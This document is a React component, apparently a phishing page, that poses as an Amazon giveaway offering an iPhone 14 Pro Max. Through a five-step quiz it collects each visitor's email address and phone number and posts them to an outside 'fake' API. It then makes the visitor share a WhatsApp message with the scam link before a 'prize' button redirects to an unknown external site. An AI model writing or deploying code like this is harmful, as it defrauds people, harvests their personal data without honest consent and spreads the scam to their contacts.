import axios from "axios";
import React from "react";
import {motion} from "framer-motion"
import {  useState } from "react";
import { Form, Button } from "react-bootstrap";

export const Preguntas = () => {
  const [GetN, SetN] = useState(1);
  const [getNumero, SetNumero] = useState("");
  const [getGmail, SetGmail] = useState("");
  const preguntas = [
    {
      id: 1,
      text: "¿conoces a amazon?",
    },
    {
      id: 2,
      text: "¿es usted mayor de 18",
    },
    {
      id: 3,
      text: "ingrese su Correo electronico",
    },
    {
      id: 4,
      text: "ingrese su numero telefonico",
    },
    {
      id: 5,
      text: "compartelo en 5 chats para desbloquear el boton y reclamar tu premio  ",
    },
  ];

  const EnviarDatos = () => {

    axios.post('http://apifake.somee.com/fake', {
      gmail: getGmail,
      telefono: getNumero

    })
      .then((response) => console(response.data))
      .catch((error) => console.log(console.log(error)));

    /* axios.get("https://localhost:7094/Fake").then((res)=> console.log(res)).catch((err) => console.log(err))
     */
  }
  const contador = () => {
    if (GetN <= 5) {
      SetN(GetN + 1);
    }
  };
  return (
    <div>
      <hr />
      <>
        <b>Pregunta {GetN} de 5: </b>
        {preguntas[GetN - 1].text}
      </>
      {GetN <= 2 ? (
        <div style={{ display: "flex", flexDirection: "column" }}>
          <button className="preguntas-buttom" onClick={contador}>
            SI
          </button>
          <button className="preguntas-buttom">No</button>
        </div>
      ) : GetN === 3 ? (
        <motion.div
        initial={{}}
        animat ={{rotate:360}}
        style={{ display: "flex", flexDirection: "column" }}>
          <Form
            onSubmit={(e) => {
              e.preventDefault();
            }}
          >
            <Form.Control
              type="email"
              placeholder="ingrese Gmail"
              name="gmail"
              value={getGmail}
              onChange={(e) => {
                SetGmail(e.target.value);
              }}
            />
            <button
              style={{ width: "97%" }}
              className="preguntas-buttom"
              onClick={(e) => {
                contador();
                // console.log(getGmail);
              }}
            >
              Listo
            </button>
          </Form>
        </motion.div>
      ) : GetN === 4 ? (
        <div>
          <Form
            onSubmit={(e) => {
              e.preventDefault();
            }}
          >
            <Form.Control
              type="phone"
              placeholder="ingrese su numero Telefonico"
              value={getNumero}
              onChange={(e) => {
                SetNumero(e.target.value);
              }}
            />
            <button
              style={{ width: "97%" }}
              className="preguntas-buttom"
              onClick={() => {
                contador();
                EnviarDatos();
              }}
            >
              Listo
            </button>
          </Form>
        </div>
      ) : (
        <div style={{ display: "flex", flexDirection: "column" }}>
          <Button
            variant="white"
            style={{ background: "green", color: "white" }}
            className="preguntas-buttom"
            onClick={(e) => {
              e.target.style.visibility = "hidden";
              document.querySelector(".btnpremio ").style.display = "block";
              window.location.href = `https://api.whatsapp.com/send?text=Participa%20En%20el%20Sorteo%20de%20un%20Iphone%2014%20pro%20Max%20https://fake-a8ef0.web.app/
          `;
            }}
          >
            Compartir por whatsapp
          </Button>

          <Button
            style={{ display: "none" }}
            onClick={() => {console.log("hola")
            window.location.href = "http://lyksoomu.com/pLot";
          }}
            desabled
            className="btnpremio"
            
          >
            Obtener Premio
          </Button>
        </div>
      )}
      <hr />
    </div>
  );
};
